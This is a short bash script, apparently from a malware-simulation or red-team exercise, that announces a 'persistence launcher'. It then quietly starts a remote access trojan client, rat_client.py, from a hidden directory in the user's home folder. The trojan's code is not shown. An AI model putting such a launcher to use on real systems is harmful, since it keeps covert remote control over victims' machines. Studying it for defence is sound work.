#!/bin/bash
echo "[*] Simulating persistence launcher"
python3 ~/.local/.hidden/rat_client.py &

